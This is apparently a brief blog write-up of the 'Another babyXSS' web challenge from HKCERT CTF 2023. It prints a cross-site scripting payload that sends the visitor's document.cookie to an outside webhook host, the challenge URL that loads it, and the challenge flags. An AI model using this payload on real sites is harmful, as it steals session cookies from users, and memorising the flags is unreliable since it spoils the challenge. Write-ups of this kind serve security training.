---
layout: post
title:  "HKCERT CTF 2023 Writeups - Another babyXSS"
date:   2023-11-12 17:24:00 +0800
category: 
    - ctf
    - hkcert23ctf
---

Here is the writeup for Another babyXSS!

> `hkcert23{he110_aga1n_4nd_we1c0m3_t0_hkc3r7_c7f}`

## 又有寶貝 XSS (100 pts) (with guide)

The official guide is [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c#%E5%8F%88%E6%9C%89%E5%AF%B6%E8%B2%9D-XSS--Baby-XSS-again-Web)

### Solution

1. Craft an exploit.

    `location='https://webhook.site/someWebHook/?cookie='+document.cookie => https://pastebin.com/xxxxxxxx`


2. Baby, now I am your trusted parent, give me your flag!

    `http://babyxss-k7ltgk.hkcert23.pwnable.hk:28232/?src=https://pastebin.com/dl/xxxxxxxx`

The flag is obtained at the webhook as `hkcert23{pastebin_0r_trashbin}`
